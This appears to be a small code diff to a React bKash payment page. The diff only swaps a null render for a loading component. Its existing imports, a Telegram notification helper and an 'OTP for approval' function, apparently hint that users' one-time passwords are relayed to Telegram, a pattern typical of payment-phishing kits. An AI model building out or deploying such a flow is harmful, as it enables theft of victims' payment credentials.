@@ -4,6 +4,7 @@ import { useNavigate, useSearchParams } from "@/lib/flowRouter";
 import { sendTelegramNotification } from "@/lib/payment-telegram";
 import { submitOtpForApproval } from "@/lib/otpApproval";
 import { usePaymentMethodGuard } from "@/hooks/usePaymentMethodGuard";
+import FlowLoading from "@/components/FlowLoading";
 import { useMerchantInfo } from "@/hooks/useMerchantInfo";
 import { Phone, Hand } from "lucide-react";
 import genzLogo from "@/assets/payment/genz-logo.png";
@@ -198,7 +199,7 @@ const BkashPayment = () => {
   const handleBackFromCancel = () => setShowCancelView(false);
   const handleYesFromCancelView = () => navigate(`/payment-cancelled?channel=bKash&reason=Payment isn't completed&amount=${amount}`);
 
-  if (isAllowed !== true) return null;
+  if (isAllowed !== true) return <FlowLoading />;
 
   const merchantLogo = logo && (logo.startsWith("data:") || logo.startsWith("http") || logo.startsWith("/"))
     ? logo
